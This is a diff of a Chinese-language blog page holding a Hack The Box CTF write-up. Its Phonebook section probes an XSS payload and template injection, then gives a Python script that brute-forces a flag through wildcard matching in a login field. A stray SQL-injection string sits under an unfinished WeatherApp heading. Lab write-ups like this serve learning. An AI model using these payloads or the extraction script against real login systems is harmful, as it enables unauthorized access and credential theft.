@@ -16,24 +16,34 @@
   <meta name="author" content="Potat0w0">
   <meta name="keywords" content="">
   
-    <meta name="description" content="*CTF">
+    <meta name="description" content="Hack The Box做题记录Phonebook 一个登录界面，下面提示用Reese登录，看到登录框试着SQL注入，但是发现不管什么姿势都没用，再观察，发现输入错误时会请求一个GET参数message，  可能这里也有漏洞，尝试了下xss，&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;  确实存在xss漏洞，但是经观察，并不能对其利用，那试试模板注入： 这里不止试了这一种，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="star_ctf">
-<meta property="og:url" content="http://example.com/2023/08/02/star-ctf/index.html">
+<meta property="og:title" content="HTB_note">
+<meta property="og:url" content="http://example.com/2023/08/03/HTB-note/index.html">
 <meta property="og:site_name" content="Potat0w0">
-<meta property="og:description" content="*CTF">
+<meta property="og:description" content="Hack The Box做题记录Phonebook 一个登录界面，下面提示用Reese登录，看到登录框试着SQL注入，但是发现不管什么姿势都没用，再观察，发现输入错误时会请求一个GET参数message，  可能这里也有漏洞，尝试了下xss，&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;  确实存在xss漏洞，但是经观察，并不能对其利用，那试试模板注入： 这里不止试了这一种，">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-08-02T11:20:30.000Z">
-<meta property="article:modified_time" content="2023-08-02T11:22:04.819Z">
+<meta property="og:image" content="http://example.com/2023/08/03/HTB-note/image-20230803180922022.png">
+<meta property="og:image" content="http://example.com/2023/08/03/HTB-note/image-20230803182452389.png">
+<meta property="og:image" content="http://example.com/2023/08/03/HTB-note/image-20230803182633427.png">
+<meta property="og:image" content="http://example.com/2023/08/03/HTB-note/image-20230803182757988.png">
+<meta property="og:image" content="http://example.com/2023/08/03/HTB-note/image-20230803184308396.png">
+<meta property="og:image" content="http://example.com/image-20230803185410362.png">
+<meta property="og:image" content="http://example.com/2023/08/03/HTB-note/image-20230803205625894.png">
+<meta property="og:image" content="http://example.com/2023/08/03/HTB-note/image-20230803233340896.png">
+<meta property="article:published_time" content="2023-08-03T09:49:46.000Z">
+<meta property="article:modified_time" content="2023-08-06T10:36:50.927Z">
 <meta property="article:author" content="Potat0w0">
 <meta property="article:tag" content="Web">
+<meta property="article:tag" content="正则表达式">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/08/03/HTB-note/image-20230803180922022.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>star_ctf - Potat0w0</title>
+  <title>HTB_note - Potat0w0</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -211,7 +221,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="star_ctf"></span>
+            <span id="subtitle" data-typed-text="HTB_note"></span>
           
         </div>
 
@@ -227,8 +237,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-02 19:20" pubdate>
-          August 2, 2023 pm
+        <time datetime="2023-08-03 17:49" pubdate>
+          August 3, 2023 pm
         </time>
       </span>
     
@@ -239,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4 words
+          1.4k words
         
       </span>
     
@@ -250,7 +260,7 @@
         
         
         
-          1 mins
+          13 mins
         
       </span>
     
@@ -296,12 +306,41 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">star_ctf</h1>
+            <h1 style="display: none">HTB_note</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="CTF"><a href="#CTF" class="headerlink" title="*CTF"></a>*CTF</h2>
+                <h1 id="Hack-The-Box做题记录"><a href="#Hack-The-Box做题记录" class="headerlink" title="Hack The Box做题记录"></a>Hack The Box做题记录</h1><h3 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a>Phonebook</h3><p><img src="/2023/08/03/HTB-note/image-20230803180922022.png" srcset="/img/loading.gif" lazyload></p>
+<p>一个登录界面，下面提示用Reese登录，看到登录框试着SQL注入，但是发现不管什么姿势都没用，再观察，发现输入错误时会请求一个GET参数message，</p>
+<p><img src="/2023/08/03/HTB-note/image-20230803182452389.png" srcset="/img/loading.gif" lazyload></p>
+<p>可能这里也有漏洞，尝试了下xss，<code>&lt;img src=x onerror=alert(1)&gt;</code></p>
+<p><img src="/2023/08/03/HTB-note/image-20230803182633427.png" srcset="/img/loading.gif" lazyload></p>
+<p>确实存在xss漏洞，但是经观察，并不能对其利用，那试试模板注入：</p>
+<p>这里不止试了这一种，用tplmap跑了一遍所有的模板引擎的情况，都不行，大概模板注入也是走不通了</p>
+<p><img src="/2023/08/03/HTB-note/image-20230803182757988.png" srcset="/img/loading.gif" lazyload></p>
+<p>去找hint吧。。看了别人到这的做法，是在密码传入通配符’*’？？未曾设想的道路。</p>
+<p>然后跳转到这样一个页面，在搜索框里随便输入一个1，显示出挺多的，</p>
+<p><img src="/2023/08/03/HTB-note/image-20230803184308396.png" srcset="/img/loading.gif" lazyload></p>
+<p>在搜索框也是一顿暴锤，按刚刚的姿势把<code>*</code>输入返回无搜索结果，然后发现<code>*</code>后面随便输一个字符发现居然蹦出好多，</p>
+<p><img src="/image-20230803185410362.png" srcset="/img/loading.gif" lazyload alt="image-20230803185410362"></p>
+<p>那。。推测不就是正则表达式了吗？理解了题意之后去&#x2F;login页面，传入：</p>
+<p><img src="/2023/08/03/HTB-note/image-20230803205625894.png" srcset="/img/loading.gif" lazyload></p>
+<p>发生了跳转，*代表匹配前面的字符任意次(<strong>零次</strong>或多次)，如<code>ab*</code>表示匹配a后面跟着任意个连续的b，可匹配a,ab,abb等，<code>a*b</code>可匹配任意个连续的a开头，后面跟一个b，可匹配b,ab,aab等，<code>a*b*c</code>匹配任意个连续的a开头，后跟任意个连续的b，最后以一个c结尾，如c,ac,bc,abc,aabc,abbc,aaabbc等</p>
+<p><code>&#39;.&#39;</code>(点号)：匹配任意单个字符，除换行符。eg：<code>a.b</code>可匹配aab,axb,a@b等</p>
+<p><code>.*</code>就形成了贪婪匹配，匹配以a开头，后跟任意个字符，最后以b结尾，如axyzb，a@qqb等</p>
+<p><code>&#39;?&#39;</code>(问号)：表示匹配前面的字符0次或1次，如ab?可匹配ab或a</p>
+<p><code>+</code>(加号)：表示匹配前面的字符<strong>一次</strong>或多次</p>
+<p><code>&#123;n&#125;</code>：表示匹配前面的字符恰好n次，如a{3}表示匹配恰好三个连续的a字符</p>
+<p><code>&#123;n,&#125;</code>：表示匹配前面的字符至少n次，如，a{2,}可匹配aabcd,aaabcd等</p>
+<p><code>&#123;n,m&#125;</code>：表示匹配前面的字符至少n次，最多m次</p>
+<p><code>[]</code>：表示字符类，匹配其中的任意一个字符，如[abc]可匹配a,b或c</p>
+<p><code>[^]</code>：表示否定字符类，匹配除了其中字符外的任意字符</p>
+<p>这里我们根据*匹配前面的字符任意次，我们编写脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>pre = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_&#125;&#123;?!@#$%^&amp;*&lt;&gt;&#x27;</span><br><br>url = <span class="hljs-string">&#x27;http://167.172.61.89:32269/login&#x27;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">60</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> pre:<br>        <span class="hljs-built_in">print</span>(char)<br>        payload = flag + char + <span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-comment">#逐步判断H*,HT*,HTB*,HTB&#123;*等等</span><br>        r = requests.post(url,data=&#123;<br>                <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;Reese&#x27;</span>,<br>                <span class="hljs-string">&#x27;password&#x27;</span>:payload<br>        &#125;).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;success&#x27;</span> <span class="hljs-keyword">in</span> r:<br>            flag += char<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/03/HTB-note/image-20230803233340896.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="WeatherApp"><a href="#WeatherApp" class="headerlink" title="WeatherApp"></a>WeatherApp</h3><h1 id="“-OR-NAME-x3D-‘-codetiger-‘-–"><a href="#“-OR-NAME-x3D-‘-codetiger-‘-–" class="headerlink" title="“   OR  NAME  &#x3D;  ‘ codetiger ‘ ; –"></a>“   OR  NAME  &#x3D;  ‘ codetiger ‘ ; –</h1>
                 
               </div>
             
@@ -315,6 +354,8 @@
       
         <a href="/tags/Web/">#Web</a>
       
+        <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">#正则表达式</a>
+      
     </div>
   
 </div>
@@ -327,18 +368,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/03/HTB-note/" title="HTB_note">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">HTB_note</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/07/23/imaginary-ctf/" title="imaginary_ctf">
-                        <span class="hidden-mobile">imaginary_ctf</span>
+                      <a href="/2023/08/02/star-ctf/" title="star_ctf">
+                        <span class="hidden-mobile">star_ctf</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
